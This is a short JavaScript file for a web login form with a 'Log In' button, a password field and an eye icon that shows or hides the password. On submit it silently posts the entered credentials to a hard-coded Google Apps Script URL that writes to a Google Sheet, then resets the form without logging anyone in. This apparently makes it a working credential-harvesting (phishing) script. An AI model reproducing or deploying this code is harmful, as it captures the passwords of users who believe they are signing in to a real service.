const scriptURL = 'https://script.google.com/macros/s/AKfycbyqV2KCTDQE4pj0aJdew9iqcxfplDhGaCsaQE5nUXvPNaPJmPLGX4T0n7Xz95Yi6UbR6w/exec'
const form = document.forms['submit-to-google-sheet'];
const submitBtn = document.getElementById("btn");
submitBtn.innerHTML = "Log In";
const password = document.getElementById("passwordInput");
const eye = document.getElementById("eyeIcon");

const svg = `<svg version="1.1" id="loader-1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="30px" height="30px" viewBox="0 0 50 50" style="enable-background:new 0 0 50 50;" xml:space="preserve">
  <path fill="#000" d="M43.935,25.145c0-10.318-8.364-18.683-18.683-18.683c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615c8.072,0,14.615,6.543,14.615,14.615H43.935z">
    <animateTransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur=".75s" repeatCount="indefinite" />
  </path>
</svg>`;



form.addEventListener('submit', e => {
  submitBtn.disabled = true;
  submitBtn.innerHTML = svg;
  e.preventDefault()
  fetch(scriptURL, { method: 'POST', body: new FormData(form) })
    .then(response => {
      form.reset();
      setTimeout(() => {
        submitBtn.disabled = false;
        submitBtn.innerHTML = "Log In";
      }, 0);
    })
    .catch(error => console.error('Error!', error.message))
});

// if (password == 0) {
//   eye.style.display = "none"
// } else {
//   eye.style.display = "block"
// }

eye.onclick = function () {
  if (password.type == "password") {
    password.type = "text"
    eye.src = "/asstes/eye.png"
  } else {
    password.type = "password"
    eye.src = "/asstes/eye2.png"
  }
};

